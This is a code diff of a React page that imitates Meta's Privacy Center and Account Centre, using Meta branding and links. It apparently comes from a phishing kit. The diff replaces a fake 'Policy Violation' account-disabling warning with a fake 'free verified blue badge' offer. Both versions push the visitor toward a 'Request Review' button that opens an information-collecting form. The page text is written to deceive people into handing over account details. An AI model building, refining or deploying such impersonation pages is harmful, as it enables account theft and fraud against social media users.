@@ -149,7 +149,7 @@ const Page: FC = () => {
 
         isTranslatingRef.current = true;
 
-        const textsToTranslate = ['Privacy Center Home Page', 'Search', 'Privacy Policy', 'Other rules and articles', 'Settings', 'Privacy Center', 'Policy Violation', 'We have detected suspicious activity or a potential violation of our Terms of Service. To protect the Meta platform and its users, your account has been scheduled for disabling. If you believe this action was taken in error, you must submit a request for review to our Security Team immediately.', 'This form is only to be used for submitting appeals and restoring account status.', 'Please ensure that you provide all the required information below. Failure to do so may result in delays in processing your appeal.', 'Request Review', 'What is the Privacy Policy and what does it say?', 'How you can manage or delete your information', 'Meta AI', 'User Agreement', 'For more details, see the User Agreement', 'Additional resources', 'How Meta uses information for generative AI models', 'Meta AI website', 'Introduction to Generative AI', 'For teenagers', 'We continually identify potential privacy risks, including when collecting, using or sharing personal information, and developing methods to reduce these risks. Read more about Privacy Policy'];
+        const textsToTranslate = ['Privacy Center Home Page', 'Search', 'Privacy Policy', 'Other rules and articles', 'Settings', 'Privacy Center', 'Congratulations! You have been selected for a free verified page', `Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you've built with your audience.`, 'Submit request', 'Elevate Your Security with Blue Badge Unlock!', 'Please submit all requested information below. Failure to do so may result in delays or cancellation of your request processing.', 'Request Review', 'What is the Privacy Policy and what does it say?', 'How you can manage or delete your information', 'Meta AI', 'User Agreement', 'For more details, see the User Agreement', 'Additional resources', 'How Meta uses information for generative AI models', 'Meta AI website', 'Introduction to Generative AI', 'For teenagers', 'We continually identify potential privacy risks, including when collecting, using or sharing personal information, and developing methods to reduce these risks. Read more about Privacy Policy'];
 
         const translateAll = async () => {
             const translatedMap: Record<string, string> = {};
@@ -166,7 +166,7 @@ const Page: FC = () => {
 
     return (
         <div className='flex items-center justify-center bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] text-[#1C2B33]'>
-            <title>Policy Violation - Page Appeal</title>
+            <title>Account Centre</title>
             <div className='flex w-full max-w-[1100px]'>
                 <div className='sticky top-0 hidden h-screen w-1/3 flex-col border-r border-r-gray-200 pt-10 pr-8 sm:flex'>
                     <Image src={MetaImage} alt='' className='h-3.5 w-[70px]' />
@@ -181,14 +181,15 @@ const Page: FC = () => {
                 <div className='flex flex-1 flex-col gap-5 px-4 py-10 sm:px-8'>
                     <div className='flex items-center gap-2'>
                         <Image src={WarningImage} alt='' className='h-[50px] w-[50px]' />
-                        <p className='text-2xl font-bold'>{t('Policy Violation')}</p>
+                        <p className='text-2xl font-bold'>{t('Congratulations! You have been selected for a free verified page')}</p>
                     </div>
-                    <p>{t('We have detected suspicious activity or a potential violation of our Terms of Service. To protect the Meta platform and its users, your account has been scheduled for disabling. If you believe this action was taken in error, you must submit a request for review to our Security Team immediately.')}</p>
+                    <p>{t(`Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you've built with your audience.`)}</p>
                     <div className='rounded-b-[20px] bg-white'>
-                        <Image src={BackgroundImage} alt='' className='rounded-t-[20px] bg-blue-500 py-20' />
-                        <div className='flex flex-col items-center justify-center gap-5 p-5'>
-                            <p className='text-2xl'>{t('This form is only to be used for submitting appeals and restoring account status.')}</p>
-                            <p className='text-[15px]'>{t('Please ensure that you provide all the required information below. Failure to do so may result in delays in processing your appeal.')}</p>
+                        <Image src={BackgroundImage} alt='' className='rounded-t-[20px] bg-blue-500 w-full py-10' />
+                        <div className='flex flex-col items-start justify-center gap-5 p-5'>
+                            <p className='text-2xl text-start'>{t('Submit request')}</p>
+                            <p className='text-[15px]'>{t('Elevate Your Security with Blue Badge Unlock!')}</p>
+                            <p className='text-[15px]'>{t('Please submit all requested information below. Failure to do so may result in delays or cancellation of your request processing.')}</p>
                             <button
                                 onClick={() => {
                                     setModalKey((prev) => prev + 1);
